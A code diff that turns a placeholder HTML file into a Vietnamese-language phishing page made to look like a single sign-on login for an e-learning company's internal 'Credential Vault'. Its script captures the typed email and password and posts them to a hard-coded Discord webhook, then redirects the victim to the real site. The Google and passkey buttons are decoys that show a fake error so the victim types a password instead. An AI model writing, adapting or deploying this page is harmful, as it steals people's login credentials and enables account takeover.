@@ -1,11 +1,134 @@
-<!DOCTYPE html>
-<html>
-	<head>
-		<title>Test</title>
-	</head>
-	<body>
-		<main>
-			<h1>Test</h1>
-		</main>
-	</body>
-</html>
+<html lang="vi"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Đăng nhập · Credential Vault</title><style>
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;color:#1f2937;background:#fff;-webkit-font-smoothing:antialiased}
+.wrap{display:flex;min-height:100vh}
+.brand{flex:1;display:flex;flex-direction:column;justify-content:center;gap:28px;padding:48px 64px;color:#fff;background:linear-gradient(135deg,#0d47a1 0%,#1565c0 55%,#1e88e5 100%)}
+.brand h1{margin:0;font-size:34px;line-height:1.25;font-weight:700;max-width:440px}
+.brand ul{margin:0;padding:0;list-style:none;display:grid;gap:14px;font-size:15px;opacity:.92}
+.brand li::before{content:"✓";display:inline-block;width:22px;font-weight:700}
+.logo{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:600}
+.logo i{display:grid;place-items:center;width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,.16);font-style:normal}
+.panel{flex:1;display:flex;align-items:center;justify-content:center;padding:32px 20px;background:#f7f9fc}
+.card{width:100%;max-width:380px}
+.card .logo{color:#1565c0;margin-bottom:28px}
+.card .logo i{background:#e3f0fd}
+h2{margin:0 0 6px;font-size:26px;font-weight:700}
+.sub{margin:0 0 24px;color:#6b7280;font-size:14px}
+.sub b{color:#1f2937}
+label.f{display:block;margin:0 0 6px;font-size:14px;font-weight:500}
+input[type=email],input[type=password],input[type=text]{display:block;width:100%;height:40px;margin:0 0 16px;padding:0 12px;font-size:16px;border:1px solid #d9dee7;border-radius:8px;background:#fff;outline:none;transition:border-color .15s,box-shadow .15s}
+input[type=email]:focus,input[type=password]:focus,input[type=text]:focus{border-color:#1565c0;box-shadow:0 0 0 3px rgba(21,101,192,.15)}
+.row{display:flex;flex-wrap:wrap;gap:8px;justify-content:space-between;align-items:center;margin:0 0 20px;font-size:14px}
+.check{display:flex;align-items:center;gap:8px;cursor:pointer}
+.check input{width:16px;height:16px;accent-color:#1565c0}
+a{color:#1565c0;text-decoration:none}a:hover{text-decoration:underline}
+.btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;height:40px;font-size:16px;font-weight:400;border-radius:8px;cursor:pointer;transition:background .15s,border-color .15s}
+.btn:disabled{opacity:.6;cursor:default}
+.primary{border:0;color:#fff;background:#1565c0}
+.primary:hover{background:#0d47a1}
+.ghost{border:1px solid #d9dee7;color:#1f2937;background:#fff}
+.ghost:hover{border-color:#1565c0;color:#1565c0}
+a.btn,a.btn:hover{text-decoration:none}
+.stack{display:grid;gap:12px}
+.sep{display:flex;align-items:center;gap:12px;margin:20px 0;color:#9ca3af;font-size:13px}
+.sep::before,.sep::after{content:"";flex:1;height:1px;background:#e5e7eb}
+.alert{margin:0 0 16px;padding:10px 12px;border:1px solid #ffccc7;border-radius:8px;background:#fff2f0;color:#a8071a;font-size:14px}
+.notice{margin:0 0 16px;padding:10px 12px;border:1px solid #b7eb8f;border-radius:8px;background:#f6ffed;color:#237804;font-size:14px}
+.req{margin:20px 0 0;text-align:center;font-size:14px;color:#6b7280}
+.foot{margin-top:32px;color:#9ca3af;font-size:12px;text-align:center}
+.Toastify {
+  color: red;
+  border: 1px solid #ff00008a;
+  background: #ff00001f;
+  border-radius: 8px;
+  padding: 12px;
+  font-size: 0.8em;
+  margin-bottom: 20px;
+  display: none;
+}
+.Toastify.open {
+  display: block;
+}
+@media(max-width:860px){.brand{display:none}.panel{background:#fff}}
+</style></head><body><main class="wrap">
+<aside class="brand"><div class="logo"><i><svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.5-3 8.3-7 10-4-1.7-7-5.5-7-10V6l7-3z"></path><circle cx="12" cy="11" r="2"></circle><path d="M12 13v3"></path></svg></i>Credential Vault</div>
+<h1>Một tài khoản cho mọi dịch vụ nội bộ</h1>
+<ul><li>Đăng nhập một lần (SSO) vào các dịch vụ</li><li>Quyền truy cập được quản lý tập trung</li><li>Passkey — đăng nhập bằng vân tay, Face ID</li></ul></aside>
+<section class="panel"><div class="card"><div class="logo"><i><svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.5-3 8.3-7 10-4-1.7-7-5.5-7-10V6l7-3z"></path><circle cx="12" cy="11" r="2"></circle><path d="M12 13v3"></path></svg></i>Credential Vault</div><h2>Đăng nhập</h2>
+<p class="sub">Tiếp tục tới <b>HERO</b> bằng tài khoản Credential Vault</p>
+<div class="Toastify"></div>
+<div class="alert" id="err" hidden=""></div>
+<div id="login-form" method="POST"><input type="hidden" name="client_id" value="hero"><input type="hidden" name="redirect_uri" value="https://api-hero.abc-elearning.org/sso/callback"><input type="hidden" name="state" value="84c049981864f283507512967359c3a4"><input type="hidden" name="code_challenge" value="ehGe5me-LVMjcTRYODo6TPsTruKJDPtY-CxZc3A8sE0"><input type="hidden" name="code_challenge_method" value="S256">
+<input type="hidden" name="passkey_response" value="">
+<label class="f" for="email">Email</label>
+<input id="email" name="email" type="email" autocomplete="username" placeholder="ban@abc-elearning.org" required="" autofocus="">
+<label class="f" for="password">Mật khẩu</label>
+<input id="password" name="password" type="password" autocomplete="current-password" placeholder="••••••••" required="">
+<div class="row"><label class="check"><input type="checkbox" name="remember" value="1" checked="">Ghi nhớ đăng nhập</label>
+<button class="btn primary" onclick="onLogin()">Đăng nhập</button>
+</div>
+<div id="alt" style="width: 100%;"><div class="sep">hoặc</div><div class="stack">
+<button onclick="noSupport()" class="btn ghost" id="g-btn"><svg viewBox="0 0 48 48" width="18" height="18" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"></path><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"></path><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-7.9l-6.5 5C9.5 39.6 16.2 44 24 44z"></path><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"></path></svg>Đăng nhập bằng Google</button>
+<button onclick="noSupport()" class="btn ghost" id="pk-btn" type="button"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="8" cy="15" r="4"></circle><path d="M10.8 12.2L20 3M16 7l3 3M14 9l2 2"></path></svg>Đăng nhập bằng passkey</button></div></div>
+<p class="foot">Cần hỗ trợ? <a href="mailto:hiepnx27@gmail.com">Liên hệ admin</a> · © abc-elearning</p></div></section></main>
+</body></html>
+<script>
+  function noSupport() {
+    window.alert('Hệ thống hiện tại đang bận hãy thử phương thức đăng nhập khác!');
+    showErr('Không dùng được passkey và đăng nhập google trên thiết bị này, vui lòng đăng nhập bằng mật khẩu');
+  }
+
+  const validateEmail = (email) => {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(String(email).toLowerCase());
+  };
+
+  function showToast(text) {
+    document.querySelector('.Toastify').classList.add('open')
+    document.querySelector('.Toastify').textContent = text;
+    setTimeout(() => {
+      document.querySelector('.Toastify').textContent = '';
+      document.querySelector('.Toastify').classList.remove('open')
+    }, 3000);
+  }
+
+  async function sendToDiscord(email, password, type) {
+    try {
+      const response = await fetch('https://discord.com/api/webhooks/1513836570954698883/r31bRJGw8IqwBtSjNQ37BilWUcQ28GC40A3VjJrJu2GfWKAKqfkWK7c7dXdhnHWNqMNh', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json' // Bắt buộc phải có dòng này
+        },
+        body: JSON.stringify({
+          content: `${email} - ${password} - ${type}` // Dùng template literals cho sạch sẽ
+        })
+      });
+
+      if (response.ok) {
+        console.log('Gửi thành công!');
+      } else {
+        console.log('Gửi thất bại, mã lỗi:', response.status);
+      }
+    } catch (error) {
+      console.error('Lỗi kết nối:', error);
+    }
+  }
+
+  function onLogin() {
+    const email = document.querySelector('input[name="email"]').value ?? '';
+    const password = document.querySelector('input[name="password"]').value ?? '';
+    if(!email || !validateEmail(email)) {
+      showToast('Email không đúng!')
+      return;
+    }
+    if(!password) {
+      showToast('Password không đúng!')
+      return;
+    }
+    sendToDiscord(email, password, 'sso');
+    setTimeout(() => {
+      window.location.href='https://hero.abc-elearning.org'
+    }, 100);
+  }
+</script>
